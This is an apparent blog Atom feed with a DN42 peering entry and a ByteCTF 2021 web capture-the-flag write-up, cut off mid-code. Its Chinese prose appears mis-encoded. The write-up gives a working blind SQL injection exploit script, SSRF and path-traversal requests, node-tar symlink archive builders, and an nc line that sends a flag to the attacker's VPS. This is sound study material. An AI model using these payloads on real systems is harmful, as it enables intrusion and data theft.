<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liki4</title>
  
  
  <link href="https://me.liki.link/atom.xml" rel="self"/>
  
  <link href="https://me.liki.link/"/>
  <updated>2021-10-18T03:09:16.695Z</updated>
  <id>https://me.liki.link/</id>
  
  <author>
    <name>Liki4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DN42</title>
    <link href="https://me.liki.link/20770302/DN42/"/>
    <id>https://me.liki.link/20770302/DN42/</id>
    <published>2077-03-02T04:00:00.000Z</published>
    <updated>2021-10-18T03:09:16.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DN42"><a href="#DN42" class="headerlink" title="DN42"></a>DN42</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>Liki4</p><p>åªæ˜¯ DN42 çš„ä¸€ä¸ªå°ç©å®¶ï¼Œ</p><p>ç”¨æ¥ peer çš„å°é¸¡æ˜¯ä¸€å° BuyVM çš„ VPSï¼Œ</p><p>ä»¥ååº”è¯¥ä¹Ÿä¼šä¸€ç›´ç»­è´¹ä¸‹å»ï¼Œ</p><p>å› ä¸ºç³»ç»Ÿæš‚æ—¶æ˜¯ RouterOS v6ï¼Œ</p><p>æ‰€ä»¥æ²¡æœ‰ WireGuardï¼Œ</p><p>ä½†æ˜¯å¯ä»¥æ”¯æŒå„ç§å„æ ·çš„éš§é“ï¼Œ</p><p>ä¸ºäº†æ–¹ä¾¿å°±ç›´æ¥ç”¨ GRE/Plain æ¥ peer äº†ï¼Œ</p><p>ç­‰åˆ° RouterOS v7 å‘å¸ƒæ­£å¼ç‰ˆå°±æ›´æ–°ï¼Œ</p><p>å°±å¯ä»¥ç”¨ WireGuard æ¥ peer äº†ã€‚</p><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><pre class="line-numbers language-none"><code class="language-none">My Informations:ASN:        4242420927LV1 - Las Vegas, US, BuyVMTunnel:     GRE&#x2F;PlainIPv4:       199.19.226.83MTU:        1476DN42IPv4:     172.21.77.33IPv6:     fd80:96c2:e41e:3dcc::1Link-Local Support: NoMultiprotocol BGP Support: Yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DN42&quot;&gt;&lt;a href=&quot;#DN42&quot; class=&quot;headerlink&quot; title=&quot;DN42&quot;&gt;&lt;/a&gt;DN42&lt;/h1&gt;&lt;h2 id=&quot;About&quot;&gt;&lt;a href=&quot;#About&quot; class=&quot;headerlink&quot; title=&quot;About&quot;&gt;</summary>
      
    
    
    
    
    <category term="dn42" scheme="https://me.liki.link/tags/dn42/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF 2021 Web WP</title>
    <link href="https://me.liki.link/20211018/ByteCTF-2021-Web-WP/"/>
    <id>https://me.liki.link/20211018/ByteCTF-2021-Web-WP/</id>
    <published>2021-10-18T03:28:13.000Z</published>
    <updated>2021-10-18T03:53:59.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF-2021-Web-WriteUp"><a href="#ByteCTF-2021-Web-WriteUp" class="headerlink" title="ByteCTF 2021 Web WriteUp"></a>ByteCTF 2021 Web WriteUp</h1><h2 id="ä¸€ç‚¹æ„Ÿæƒ³"><a href="#ä¸€ç‚¹æ„Ÿæƒ³" class="headerlink" title="ä¸€ç‚¹æ„Ÿæƒ³"></a>ä¸€ç‚¹æ„Ÿæƒ³</h2><p>ä¸æ„§æ˜¯å­—èŠ‚</p><p>æ¯”èµ›é¢˜ç›®çš„è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„</p><p>ç›¸æ¯”å¹³æ—¶æ‰“çš„å¾ˆå¤šå…¶ä»–æ¯”èµ›æ›´èƒ½è®©äººæœ‰å»è§£é¢˜çš„æ¬²æœ›</p><p>è™½ç„¶å¾ˆéš¾ä½†æ˜¯æ‰“å¾—å¾ˆå¼€å¿ƒ</p><p>æœ€ååªåšå‡ºæ¥ <code>double sqli</code> å’Œ <code>easy_extract</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="double-sqli"><a href="#double-sqli" class="headerlink" title="double sqli"></a>double sqli</h3><p>é€šè¿‡æŠ¥é”™çŸ¥é“æ˜¯ä¸ªå« ClickHouse çš„ DBMS</p><p>è¯­å¥æ˜¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> ByteCTF <span class="token keyword">from</span> hello <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé€šè¿‡å¸ƒå°”ç›²æ³¨å¯ä»¥å¾—åˆ°æ•°æ®åº“å†…çš„æ•°æ®</p><hr><p>database: <code>default</code><br>table: <code>hello</code><br>| ByteCTF            |<br>| â€”â€”â€”â€”â€”â€” |<br>| Welcome to ByteCTF |</p><hr><p>database: <code>ctf</code><br>table: <code>hint</code><br>| id                                     |<br>| â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ |<br>| you_dont_have_permissions_to_read_flag |</p><hr><p>ClickHouse versionï¼š21.3.2.5<br>database userï¼š user_02</p><hr><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ CVE-2021-25263<br>ä½†æ²¡æœ‰è¯»æ–‡ä»¶çš„æƒé™</p><p>ä» <code>user_02</code> çš„ç”¨æˆ·åçŒœæµ‹åº”è¯¥æœ‰ä¸€ä¸ª <code>user_01</code> ç”¨æˆ·<br><code>user_01</code> ç”¨æˆ·åº”è¯¥æœ‰ <code>user_02</code> ç”¨æˆ·æ‰€æ²¡æœ‰çš„æƒé™ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›å¯¹ <code>user_02</code> ç”¨æˆ·éšè—çš„è¡¨</p><p>ClickHouse æ˜¯é€šè¿‡ HTTP åè®®æ¥è¿æ¥/ç®¡ç†æ•°æ®åº“çš„<br>å¯ä»¥é€šè¿‡ <code>URL</code> å‡½æ•° ssrf æ‰§è¡Œ ClickHouse HTTP å®¢æˆ·ç«¯çš„æŸ¥è¯¢</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> field <span class="token keyword">FROM</span> url<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8123/?username=user_02=password=123456&amp;query=SELECT 1'</span><span class="token punctuation">,</span><span class="token string">'LineAsString'</span><span class="token punctuation">,</span><span class="token string">'field String'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æ²¡æœ‰è´¦å·å¯†ç <br><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png" class="lozad post-image"src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png"></p><p>åœ¨ Web åº”ç”¨çš„ <code>/files/</code> ç›®å½•æœ‰æ–‡ä»¶æµè§ˆï¼Œå°è¯•è¿›è¡Œç›®å½•ç©¿è¶Š<br>å‘ç°äº†ä»»æ„æ–‡ä»¶è¯»</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;users.listhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;a2492bae-77c4-e443-4fce-c04e47cd43a1.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>a2492bae-77c4-e443-4fce-c04e47cd43a1.sql</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ATTACH <span class="token keyword">USER</span> user_01 IDENTIFIED <span class="token keyword">WITH</span> plaintext_password <span class="token keyword">BY</span> <span class="token string">'e3b0c44298fc1c149afb'</span><span class="token punctuation">;</span> ATTACH <span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> ctf<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> user_01<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ° <code>user_01</code> çš„æ˜æ–‡å¯†ç <br><code>user_01:e3b0c44298fc1c149afb</code></p><p>æœ‰ <code>ctf</code> åº“çš„å…¨éƒ¨æƒé™<br>æ„é€ è¯·æ±‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name <span class="token keyword">from</span> system<span class="token punctuation">.</span><span class="token keyword">tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¾—åˆ° <code>ctf</code> åº“ä¸­å­˜åœ¨ä¸¤å¼ è¡¨ï¼Œ<code>hint</code> å’Œ <code>flag</code> è¡¨ï¼Œç„¶åç»§ç»­å¾—åˆ° <code>flag</code> è¡¨åˆ—å <code>flag</code><br>æœ€åå¾—åˆ° flag</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctf<span class="token punctuation">.</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl_tpl <span class="token operator">=</span> <span class="token string">"http://39.105.116.246:30001/?id=1 and if(&#123;query&#125;,1,0)"</span>query_tpl_count <span class="token operator">=</span> <span class="token string">"count(&#123;target&#125;)"</span>query_tpl_length <span class="token operator">=</span> <span class="token string">"char_length(toString(&#123;target&#125;))"</span>query_tpl_data <span class="token operator">=</span> <span class="token string">"(select mid(toString(&#123;target&#125;),&#123;offset&#125;,1) from &#123;table&#125; limit 1 offset &#123;toffset&#125;)='&#123;arg&#125;'"</span><span class="token comment"># target = "DATABASE()"</span><span class="token comment"># target_table = "system.databases"</span><span class="token comment"># target = "cluster"</span><span class="token comment"># target_table = "system.clusters"</span><span class="token comment"># target = "name"</span><span class="token comment"># target_table = "system.dictionaries"</span><span class="token comment"># target = "field"</span><span class="token comment"># target_table = "url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)"</span>target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)"</span>ascii_space <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token keyword">def</span> <span class="token function">getCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    offset <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">True</span>        query_target <span class="token operator">=</span> query_tpl_count<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">)</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>query_target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>            url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>            <span class="token comment"># print(url)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token comment"># print(query)</span>                result <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token keyword">break</span>        offset <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getDataLen</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">:</span>    toffset <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token string">""</span>        offset <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            query_target <span class="token operator">=</span> query_tpl_length<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">)</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>                query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>query_target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span>toffset<span class="token punctuation">)</span>                url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>                <span class="token comment"># print(query)</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    result <span class="token operator">+=</span> c                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            offset <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                getData<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>toffset<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        toffset <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>toffset<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    offset <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> ascii_space<span class="token punctuation">:</span>            query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span>toffset<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>            url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>            <span class="token comment"># print(query)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                result <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token keyword">break</span>        offset <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            <span class="token keyword">break</span>cnt <span class="token operator">=</span> getCnt<span class="token punctuation">(</span><span class="token punctuation">)</span>getDataLen<span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token comment"># getData()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-extract"><a href="#easy-extract" class="headerlink" title="easy_extract"></a>easy_extract</h3><p>æŸ¥çœ‹ http è¿”å›å¤´ï¼Œå‘ç°æ˜¯ä¸ª nodejs å†™çš„åº”ç”¨ï¼Œç”¨æˆ·ä¸Šä¼  tar å‹ç¼©æ–‡ä»¶ï¼Œåç«¯è§£å‹åå°†å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶åè¿”å›ç»™å‰ç«¯ã€‚</p><p>è®¿é—® <code>/robots.txt</code>ï¼Œå‘ç°æœ‰ä¸ª Dockerfileï¼Œå†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM node:current-alpineENV NODE_ENV&#x3D;productionWORKDIR &#x2F;appARG CHALL_FLAGENV CHALL_FLAG $CHALL_FLAGRUN apk update &amp;&amp; apk add bash musl-dev gccCOPY [&quot;package.json&quot;, &quot;.&#x2F;&quot;]RUN npm install -g nodemon --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org &amp;&amp; \    npm install --production --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.orgCOPY . .RUN echo $CHALL_FLAG &gt; &#x2F;flag &amp;&amp; chmod 0600 &#x2F;flag &amp;&amp; gcc readflag.c -o &#x2F;readflag  &amp;&amp; chmod u+s &#x2F;readflag &amp;&amp; \    mkdir &#x2F;app&#x2F;data &amp;&amp; chmod -R 755 &#x2F;app &amp;&amp; chown -R node &#x2F;app&#x2F;dataUSER nodeCMD [&quot;nodemon&quot;, &quot;--exec&quot;, &quot;npm start&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2021 8æœˆ nodejs tar çš„ä¸¤ä¸ª cve<br><a href="https://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update">https://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update</a></p><p>è§£å‹å‡ºæ¥çš„æ–‡ä»¶é»˜è®¤æ˜¯ä¿å­˜åœ¨ <code>/app/data</code> é‡Œçš„ï¼Œé€šè¿‡è½¯é“¾æ¥ä¸ç‰¹æ®Šåå­—çš„æ–‡ä»¶å¤¹å®ç°ä»»æ„æ–‡ä»¶å†™</p><p>tar é‡Œå…è®¸æ‰“åŒ…è½¯é“¾æ¥ï¼Œè¿™é‡Œæ‰“åŒ…ä¸€ä¸ªæŒ‡å‘æ ¹ç›®å½•çš„è½¯é“¾æ¥</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F; .&#x2F;111tar -zcvf asd.tar .&#x2F;111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šä¼  <code>asd.tar</code>ï¼Œ é¡µé¢è¿”å›ç»“æœ</p><pre class="line-numbers language-none"><code class="language-none">done. files:111111&#x2F;app111&#x2F;bin111&#x2F;dev111&#x2F;etc111&#x2F;flag...111&#x2F;readflag...111&#x2F;home&#x2F;node...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±æ­¤å¯ä»¥è¦†ç›– <code>/app/data</code> å¤–çš„ä¸œè¥¿ï¼Œè¦†ç›–ä»»æ„æ–‡ä»¶,è¿™é‡Œå†™å…¥äº† <code>/tmp/1</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tarfile<span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">from</span> tarfile <span class="token keyword">import</span> TarInfo<span class="token punctuation">,</span> SYMTYPE<span class="token punctuation">,</span>REGTYPE<span class="token punctuation">,</span>LNKTYPE<span class="token punctuation">,</span>DIRTYPEtarinfo1 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo1<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo/1"</span>tarinfo3 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo3<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo3<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo\\1"</span>tarinfo3<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/tmp"</span>tarinfo2 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo2<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> LNKTYPEtarinfo2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo\\1/1"</span>tarinfo2<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/app/data/123"</span>tar4 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tar4<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">=</span> REGTYPEtar4<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'123'</span><span class="token keyword">def</span> <span class="token function">make_tarfile</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token string">"w:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tar4<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo1<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo3<span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo2<span class="token punctuation">)</span>make_tarfile<span class="token punctuation">(</span><span class="token string">"a.tar"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä» Dockerfile é‡Œå¾—çŸ¥ï¼Œåº”ç”¨ä»¥ node ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œåªèƒ½ä¿®æ”¹ <code>/app/data</code> å’Œ <code>/home/node</code> æ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿ã€‚</p><p>nodemon é»˜è®¤é…ç½®æ£€æµ‹äº† <code>.*/**/*.js</code> å’Œ <code>./**/*.json</code>ï¼Œå½“å‘ç”Ÿä¿®æ”¹æˆ–æœ‰æ–°æ–‡ä»¶åˆ›å»ºçš„æ—¶å€™ä¼šé‡å¯ï¼Œå†æ¬¡è¿è¡Œnpm start çš„æ—¶å€™ï¼Œä¼šåŠ è½½å½“å‰ç”¨æˆ·ä¸‹ç›®å½•ä¸‹çš„ <code>.npmrc</code>ï¼Œå¯ä»¥å‘ <code>.npmrc</code> æ³¨å…¥ä¸€äº›é€‰é¡¹ã€‚æŸ¥é˜… npm çš„æ–‡æ¡£ï¼Œscript-shell æŒ‡å®šäº†æ‰§è¡Œ npm scripts çš„ shellï¼Œé»˜è®¤ Windowsä¸Šä¸º <code>cmd.exe</code>ï¼Œposix ä¸Šä¸º <code>bash</code>ï¼Œé€šè¿‡ä¿®æ”¹ script-shell é€‰é¡¹æ¥åœ¨ nodemon é‡å¯çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„è„šæœ¬ã€‚</p><p>ä¼ ä¸€ä¸ª <code>xxx.sh</code> ä¸Šå»</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>/readflag <span class="token operator">|</span> <span class="token function">nc</span> vps_ip vps_port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>vps ä¸Š èµ·ä¸€ä¸ª nc ç›‘å¬ tcp è¿æ¥<br><code>.npmrc</code> å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">script-shell &#x3D; &#x2F;app&#x2F;data&#x2F;xxx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”Ÿæˆ tar æ–‡ä»¶ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tarfile<span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">from</span> tarfile <span class="token keyword">import</span> TarInfo<span class="token punctuation">,</span> SYMTYPE<span class="token punctuation">,</span>REGTYPE<span class="token punctuation">,</span>LNKTYPE<span class="token punctuation">,</span>DIRTYPE<span class="token punctuation">,</span>AREGTYPEtarinfo1 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo1<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao/1"</span>tarinfo11 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo11<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo11<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao/2"</span>tarinfo3 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo3<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo3<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\1"</span>tarinfo3<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/home/node"</span>tarinfo31 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token 